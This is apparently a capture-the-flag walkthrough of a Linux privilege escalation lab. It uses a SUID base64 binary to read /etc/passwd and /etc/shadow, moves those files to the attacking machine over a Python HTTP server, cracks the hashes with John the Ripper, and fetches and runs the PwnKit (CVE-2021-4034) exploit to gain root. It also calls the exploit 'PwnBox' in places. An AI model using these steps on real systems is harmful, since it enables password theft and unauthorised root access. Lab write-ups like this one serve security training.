It's time for some more privilege escalation! This time it's about checking what binaries have SUID bit set.

# Getting the lay of the land

Our first question is asking about which user has a name of a famous comic book writer. This tells us we're going to need to read /etc/passwd. The idea is that our privilege escalation will likely focus on file read, at least to start.

We start by listing all the binaries for which the SUID bit is set for our `karen` user.

We start with the following command:

```sh
find / -type f -perm -04000 -ls 2>/dev/null
```
Here's the result, focusing on those binaries found in `/usr/bin`:

The next step is to scan [GTFOBins](https://gtfobins.github.io/#+suid) with SUID filter on...

# Finding something useful...

After a bit of perusing GTFOBins, we spot an entry for `base64`:

![Base64-SUID](/assets/img/GTFOBins-base64-SUID.png)

Since it's already a SUID binary, we can read files with elevated privileges with the following command:

```sh
base64 /path/to/file | base64 --decode
```

# Reading privileged files

With this knowledge, we can now read `/etc/passwd`!

We run the following command:

```sh
$ base64 /etc/passwd | base64 --decode
```

Here's the result!

Bingo! Looks like our comic user is `gerryconway`. Gerry Conway is the co-creator of *The Punisher* and apparently has account on this VM!

Ok question 1 successfully solved! Awesome!

# Cracking some passwords

The next question is asking us for the password of `user2`. We're going to need the contents of `/etc/shadow` along with `/etc/passwd` and then user `unshadow` on our AttackBox to get things set up for John the Ripper.

Privileged file read is already available to us! We just need to user `base64` again!

```sh
$ base64 /etc/shadow | base64 --decode
```

Here's the result!

![etc/shadow](/assets/img/etc-shadow-lin-priv-esc-suid.png)

Since I had accessed the target computer via `ssh` on a terminal on the AttackBox, I just used the clipboard to create `passwd.txt` and `shadow.txt` on the AttackBox. Alternatively, we could redirect the output of `base64` to a writable directory, such as `/dev/shm` as follows:

```sh
$ base64 /etc/passwd | base64 --decode > /dev/shm/passwd.txt
$ base64 /etc/shadow | base64 --decode > /dev/shm/shadow.txt
```

We can then `cd /dev/shm` and start up an simple HTTP server:

```sh
$ cd /dev/shm
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then on our AttackBox we can use `wget` to grab each file.

However we get the contents of `/etc/passwd` and `/etc/shadow` on the AttackBox (copy/paste or with `wget`), the next step is to run `unshadow`:

```sh
$ unshadow passwd.txt shadow.txt > passwords.txt
```

We're all set to run John the Ripper!

```sh
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt passwords.txt
```

This gives us the following, 3 cracked passwords!

That's another question answered! Hoorah!

# Capturing the Flag

I'll be honest, I took a bit of a long circuitous route to get the contents of `flag3.txt`. Briefly, the simple way is just to remember that we can use `base64` for elevated privilege on file read. So after we locate the file with `find \ -name "flag3.txt" 2>/dev/null`, which tells us the file is located in `/home/ubuntu`, we can just run:

```sh
$ base64 /home/ubuntu/flag3.txt | base64 --decode
```
And we're done!

That's the easy way!  I took....The long way.

I had my mind set on adding a user with root privileges to `/etc/passwd` (using `openssl` to generate a hash). I knew I had file read, but I wanted file write (something like `nano`), so I started logging in as the other users whose passwords I just cracked. I logged in with each user and searched for binaries that had the SUID bit set. No real luck though.

I then noticed that the SUID bit was set for the binary `/usr/bin/pkexec`. While there was no mention of this binary in GTFOBins, I did a little research and discovered that this binary suffers from a vulnerability that permits privilege escalation!

# CVE-2021-4034

Unless it's been patched, `pkexec` is affected by the CVE-2021-4034 `PwnBox` vulnerability.

Binaries for `PwnBox` are easily available online, and so on the AttackBox (which is connected to the Internet), I downloaded the binary.

```sh
$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
```

I next started a simple HTTP server and used `wget` from the target VM to get the binary on it. I wrote the binary to `/dev/shm/` as I have both write access and I can execute files from that directory.

The next step was to make the file executable:

```sh
$ chmod +x PwnBox
```

Now it's time to try it out!!!

![Root!](/assets/img/root-lin-priv-esc-suid.png)

And we're `root`!!!! A bit of overkill to get the contents of `flag3.txt`, but in the struggle we learned about a new vulnerability and did some more privilege escalation!

# ðŸ§  Takeaways

âœ… **Always check file permissions first** â€” donâ€™t assume you need root to read a file!  
âœ… SUID + GTFOBins = ðŸ’¥  
âœ… `base64` is a stealthy tool for privilege escalation when `cat` and `less` are blocked  
âœ… `/dev/shm` is a goldmine for temporary file transfer/execution  
âœ… PwnKit is powerful, but donâ€™t escalate when you donâ€™t need to ðŸ˜‰  
âœ… CTFs reward **curiosity**, even if it means going the long way around
